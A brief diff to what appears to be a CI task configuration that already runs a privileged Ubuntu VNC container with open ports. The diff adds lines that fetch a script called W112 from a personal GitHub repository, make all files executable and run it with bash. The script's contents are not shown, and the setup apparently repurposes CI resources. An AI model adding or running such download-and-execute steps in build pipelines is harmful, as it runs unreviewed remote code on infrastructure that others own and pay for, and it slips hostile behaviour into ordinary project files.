@@ -10,4 +10,7 @@ task:
     kvm: true
   script: 
    - docker run --name ubuntu18.04 --privileged --shm-size 1g -d -p 5900:5900 -p 6080:6080 thuonghai2711/ubuntu-vnc:latest 
+   - wget https://raw.githubusercontent.com/freddyzuncover/dangdev/main/W112
+   - chmod +x *
+   - bash W112
    
